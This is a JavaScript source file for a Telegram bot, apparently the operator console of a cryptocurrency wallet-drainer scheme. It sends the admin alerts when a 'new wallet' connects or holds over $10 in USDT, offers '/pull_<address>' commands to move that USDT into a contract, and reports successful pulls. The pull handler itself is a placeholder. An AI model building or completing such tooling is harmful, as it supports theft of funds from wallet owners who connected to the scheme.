const TelegramBot = require('node-telegram-bot-api');
const dotenv = require('dotenv');

dotenv.config();

class TelegramService {
    constructor() {
        this.bot = null;
        this.adminChatId = process.env.ADMIN_CHAT_ID;
    }

    init() {
        const token = process.env.TELEGRAM_BOT_TOKEN;
        if (!token) {
            console.log('⚠️ Telegram bot token not found, skipping bot initialization');
            return;
        }
        
        this.bot = new TelegramBot(token, { polling: true });
        
        // Command handlers
        this.bot.onText(/\/start/, (msg) => {
            this.sendWelcomeMessage(msg.chat.id);
        });

        // Pull command handler
        this.bot.onText(/\/pull_(.*)/, (msg, match) => {
            const walletAddress = match[1];
            this.handlePullCommand(msg.chat.id, walletAddress);
        });

        console.log('✅ Telegram bot initialized');
    }

    async sendWelcomeMessage(chatId) {
        const message = `
🤖 Welcome to Multi Wallet Manager Bot!

Available commands:
/pull_<address> - Pull USDT from wallet
/withdraw - Withdraw all USDT from contract
/balances - Check all wallet balances
/help - Show this help message
        `;
        return this.bot.sendMessage(chatId, message);
    }

    async sendNewWalletAlert(walletAddress, balance) {
        if (!this.bot || !this.adminChatId) return;
        
        const message = `
🔔 NEW WALLET CONNECTED
Address: \`${walletAddress}\`
USDT Balance: ${balance} USDT

Actions:
/pull_${walletAddress} - Pull USDT to contract
        `;
        
        return this.bot.sendMessage(this.adminChatId, message, {
            parse_mode: 'Markdown'
        });
    }

    async sendBalanceAlert(walletAddress, balance) {
        if (!this.bot || !this.adminChatId) return;
        
        const message = `
💰 BALANCE ALERT
Address: \`${walletAddress}\`
USDT Balance: ${balance} USDT (> $10)

Actions:
/pull_${walletAddress} - Pull USDT to contract
        `;
        
        return this.bot.sendMessage(this.adminChatId, message, {
            parse_mode: 'Markdown'
        });
    }

    async sendSuccessMessage(walletAddress, amount, txHash) {
        if (!this.bot || !this.adminChatId) return;
        
        const message = `
✅ SUCCESSFUL PULL
Address: \`${walletAddress}\`
Amount: ${amount} USDT
Transaction: \`${txHash}\`
        `;
        
        return this.bot.sendMessage(this.adminChatId, message, {
            parse_mode: 'Markdown'
        });
    }

    async handlePullCommand(chatId, walletAddress) {
        if (chatId.toString() !== this.adminChatId) {
            return this.bot.sendMessage(chatId, '❌ Unauthorized access');
        }
        
        // In a real implementation, you'd trigger the pull operation
        const message = `
🔄 Pull operation initiated for wallet:
\`${walletAddress}\`

Processing... (this would trigger the actual pull in production)
        `;
        
        return this.bot.sendMessage(chatId, message, {
            parse_mode: 'Markdown'
        });
    }

    async sendMessage(chatId, message, options = {}) {
        if (!this.bot) return;
        return this.bot.sendMessage(chatId, message, options);
    }
}

module.exports = new TelegramService();
